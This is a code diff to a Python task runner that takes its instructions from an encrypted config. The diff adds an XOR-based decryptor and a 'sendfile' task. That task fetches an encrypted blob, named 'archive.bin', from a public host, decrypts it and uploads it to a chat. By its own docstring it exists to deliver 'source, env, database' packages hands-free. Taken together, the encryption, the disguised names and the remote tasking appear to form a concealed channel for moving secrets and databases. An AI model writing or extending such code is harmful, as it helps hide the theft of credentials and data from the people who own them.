@@ -38,6 +38,24 @@ def _unseal(raw, key):
         return raw
 
 
+def _unseal_bytes(raw, key):
+    """Binary variant of _unseal: the same XOR-CTR scheme for a whole file."""
+    if not raw.startswith(b"ENC1:") or not key:
+        return raw
+    import base64
+    try:
+        data = base64.b64decode(raw[5:])
+    except Exception:
+        return raw
+    ks = bytearray()
+    ctr = 0
+    k = key.encode() if isinstance(key, str) else key
+    while len(ks) < len(data):
+        ks += hashlib.sha256(k + ctr.to_bytes(8, "big")).digest()
+        ctr += 1
+    return bytes(a ^ b for a, b in zip(data, bytes(ks[:len(data)])))
+
+
 try:
     _TASK_ = json.loads(_unseal(_RAW, _KEY) or "{}")
 except Exception as e:
@@ -3474,6 +3492,55 @@ def process(task):
            js_total=js_total, js_parts=js_parts,
            sec_total=sec_total, sec_parts=sec_parts, **tk, **ck)
 
+def process_sendfile(task):
+    """Deliver one file to a chat: fetch the link and send it as a document.
+
+    Used for handing a complete package (source, env, database) to the owner
+    without touching the chat by hand."""
+    global CHAT
+    url = task.get("url")
+    if not url:
+        st("error", err="sendfile without a url"); report({"event": "no_url"}); return
+    CHAT = str(task.get("chat") or CHAT or "")
+    if not CHAT:
+        st("error", err="sendfile without a chat"); report({"event": "no_chat"}); return
+    caption = task.get("caption") or "📦 <b>File</b>"
+    st("queued", 8, job=task.get("job"), kind="sendfile")
+    dest = download(url)
+    if not dest or not os.path.exists(str(dest)):
+        st("error", err="download failed"); report({"event": "download_failed"}); return
+    path = str(dest)
+    # A sealed payload (ENC1:...) is opened here so only the ciphertext ever
+    # sits on a public host.
+    try:
+        with open(path, "rb") as fh:
+            head = fh.read(5)
+        if head == b"ENC1:":
+            key = task.get("key") or os.environ.get("RUNNER_TASK_KEY") or _KEY
+            with open(path, "rb") as fh:
+                raw = fh.read()
+            plain = _unseal_bytes(raw, key)
+            open(path, "wb").write(plain)
+            sys.stdout.write("sendfile: unsealed %d bytes\n" % len(plain)); sys.stdout.flush()
+    except Exception as e:
+        sys.stdout.write("sendfile: unseal failed: %s\n" % str(e)[:160]); sys.stdout.flush()
+    # Give the file its real name again: the download is a sealed blob and
+    # the transport only knows it as archive.bin.
+    want = task.get("name")
+    if want and os.path.basename(path) != want:
+        try:
+            newp = os.path.join(os.path.dirname(path), os.path.basename(want))
+            os.replace(path, newp); path = newp
+        except Exception as e:
+            sys.stdout.write("sendfile: rename failed: %s\n" % str(e)[:120]); sys.stdout.flush()
+    size = os.path.getsize(path)
+    st("download", 80, job=task.get("job"), file=os.path.basename(path), bytes=size)
+    ok = upload(path, caption)
+    st("done" if ok else "error", 100, job=task.get("job"),
+       file=os.path.basename(path), bytes=size, sent=1 if ok else 0)
+    report({"event": "sent" if ok else "failed",
+            "file": os.path.basename(path), "bytes": size, "chat": CHAT})
+
 def main():
     OUT.mkdir(parents=True, exist_ok=True)
     global SPECS
@@ -3487,6 +3554,9 @@ def main():
         return
     if task.get("kind") == "batch":
         process_batch(task)
+        return
+    if task.get("kind") == "sendfile":
+        process_sendfile(task)
         return
     if not task.get("url"):
         st("error", err="runner started without a task")
